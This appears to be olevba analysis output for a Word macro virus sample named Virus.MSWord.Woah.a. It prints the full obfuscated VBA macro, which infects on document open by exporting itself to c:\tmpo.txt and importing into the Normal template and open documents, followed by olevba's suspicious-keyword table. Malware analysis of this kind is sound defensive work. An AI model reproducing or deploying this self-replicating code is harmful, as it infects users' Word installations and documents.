olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Woah.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Woah.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WoHam.bas 
in file: Virus.MSWord.Woah.a - OLE stream: 'Macros/VBA/WoHam'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
If NormalTemplate.VBProject.Description = "WoHam" Then GoTo Done
NormalTemplate.VBProject.Description = "WoHam"
Set aebCxZhU = NormalTemplate
Set aebClJKj = aebCxZhU
Set HcXzCccF = aebCxZhU
Set XzWqHKok = aebCxZhU
'''''''''''''''''''''''''''''''
Set itogfkfl = ActiveDocument
Set ptohkofk = itogfkfl
Set ooorptty = ptohkofk
Set XzWwwqqd = ooorptty
'''''''''''''''''''''''''''''''
Const ooooiiiiii = "c:\tmpo.txt"
Dim gFDFddSDxsxSD, gFDssSSsASSde, UYrRfdreD As Balloon
Const ounfbdvfxdv = ooooiiiiii
Dim GgFDFddDxsx, gFDsssASSde, UYrtFreD As String
Const ptotpdnzjdj = ounfbdvfxdv
''''''''''''''''''''''''''''''''
Const CzXCddDDRf = "WoHam"
Dim GgFDFddDSDxsxSD, gFDssSSsssASSde, UYrtFRfdreD As String
Const CzXCddoepf = CzXCddDDRf
Dim GgFDFddDxsxSD, gFDssSSsssde, UYrtFRfdrD As String
Const CVxWdDcFFv = CzXCddoepf
Dim GgDFddDSDxsxSD, gFDsSSsssASSde, UYrtFRdreD As String
Const CVOOBvVcvX = CVxWdDcFFv
''''''''''''''''''''''''''''''''
Dim ghGHgGdfDdFdDdfgdrdDRDrdRDRTdrtdrtDD, ghFGdFDDssDssSDSDsd
Const gFDsHHHGfgFddfe = CVOOBvVcvX
Dim ghGHgGdfDdFdDdFfgdrdDRDrdRDRTdrtdrtDD, ghFdFDDssDSssSDSDsd
XzWwwqqd.VBProject.VBCOMPONENTS(CVOOBvVcvX).export ptotpdnzjdj
Dim ghGHgGdfDdFdDdFfgrdDRDrdRDRTdrtdrtDD, ghFGdFDssDSssSDSDsd
XzWqHKok.VBProject.VBCOMPONENTS.Import ptotpdnzjdj
Dim ghGHgGdfDdFdDdFfgdrdDRDrDRTdrtdrtDD, ghFdFDDsssSDSDsd
Done:
If ActiveDocument.VBProject.Description = "WoHam" Then GoTo DocDone
ActiveDocument.VBProject.Description = "WoHam"
ActiveDocument.VBProject.VBCOMPONENTS.Import ptotpdnzjdj
DocDone:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

